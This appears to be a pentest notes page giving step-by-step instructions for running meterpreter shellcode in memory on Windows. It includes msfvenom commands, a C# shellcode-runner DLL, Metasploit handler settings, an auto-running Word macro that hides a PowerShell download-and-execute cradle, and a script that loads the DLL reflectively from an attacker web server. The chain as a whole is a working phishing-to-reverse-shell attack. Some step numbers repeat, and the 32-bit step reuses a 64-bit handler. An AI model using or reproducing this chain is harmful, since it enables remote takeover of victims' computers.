---
title: Powershell and Win32 API (In Memory)
layout: default
parent: Shellcode
nav_order: 6
---

1. Generate msfvenom with:\
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`

2. Visual Studio -> New Project -> "Class Library (.NET Framework)" (for C#).

3. For Class1.cs, the code as below. Change to Release and 64 bit before Building:
```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    [ComVisible(true)]
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
      uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
          IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void runner()
        {
            byte[] buf = new byte[646] { };

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

4. To receive the incoming shell (change the set payload to the one you set):
```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost IP
set lport PORT
exploit
```

5. If want to use Word macro as a combo, first prepare 32 bit shellcode:
`msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`

6. Visual Studio same, just dont need to put 64 bits. Change msfconsole to generate 32 bit shell. Put this in /var/www/html/ClassLibrary1.dll:
```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost IP
set lport PORT
exploit
```

7. In Word macro (remember to select Doc1 instead of all docs):
```
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

6. Then prepare run.ps1 as below, move it to /var/www/html/run.ps1.
```
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.239/ClassLibrary1.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

7. Restart apache2:\
`sudo systemctl restart apache2`